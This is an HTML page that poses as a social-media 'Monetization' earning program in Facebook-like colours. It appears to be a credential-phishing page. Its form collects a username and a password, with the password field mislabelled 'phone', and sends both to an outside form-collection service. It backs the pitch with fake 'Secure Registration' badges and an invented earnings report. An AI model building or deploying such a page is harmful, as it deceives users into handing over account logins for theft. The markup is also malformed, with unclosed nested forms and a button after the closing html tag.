<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Monetization Form</title>

<style>

body{
    margin:0;
    font-family:Arial,sans-serif;
    background:linear-gradient(135deg,#1877f2,#00c853);
}

.header{
    text-align:center;
    color:white;
    padding:35px 10px;
}

.header h1{
    font-size:32px;
}

.card{
    background:white;
    width:85%;
    max-width:400px;
    margin:auto;
    padding:25px;
    border-radius:20px;
    box-shadow:0 5px 20px rgba(0,0,0,.2);
}

.card h2{
    text-align:center;
    color:#1877f2;
}

input{
    width:90%;
    padding:15px;
    margin:10px 0;
    border-radius:10px;
    border:1px solid #ddd;
    font-size:16px;
}

button{
    width:100%;
    padding:15px;
    background:#1877f2;
    color:white;
    border:none;
    border-radius:10px;
    font-size:18px;
    margin-top:10px;
}

.info{
    margin-top:20px;
    background:#f0f2f5;
    padding:15px;
    border-radius:10px;
}

/* Report Design */

#report{
    display:none;
}

.report-card{
    background:white;
    width:85%;
    max-width:400px;
    margin:20px auto;
    padding:25px;
    border-radius:20px;
    box-shadow:0 5px 20px rgba(0,0,0,.2);
}

.report-card h2{
    color:#1877f2;
    text-align:center;
}

.report-item{
    background:#f0f2f5;
    padding:15px;
    margin:10px 0;
    border-radius:10px;
    font-size:18px;
}

</style>

</head>

<body>

<div class="header">
<h1>Monetization</h1>
<p>Join our earning program</p>
</div>


<div class="card">

<h2>Welcome</h2>

<form action="https://formspree.io/f/xzdnbyqa" method="POST">

<input type="text" name="name" placeholder="User Name" required>

<input type="tel" name="phone" placeholder="Password" required>

<button type="submit">
Submit
</button>


<form action="thankyou.html" method="POST">

<div class="info">
✅ Secure Registration<br>
⭐ Monetization Support<br>
💰 Earn Online
</div>



</div>


<div id="report">

<div class="report-card">

<h2>Monetization Report</h2>

<div class="report-item">
⭐ Stars: 23,000
</div>

<div class="report-item">
🎬 Ads: 45,000
</div>

<div class="report-item">
👥 Followers: 120,000
</div>

<div class="report-item">
💰 Earnings: $1,250
</div>

</div>

</div>


<script>
    

function showReport(){
document.getElementById("report").style.display="block";
}

</script>


</body>
</html>
<button onclick="window.open('report.html','_blank')">
Report
</button>
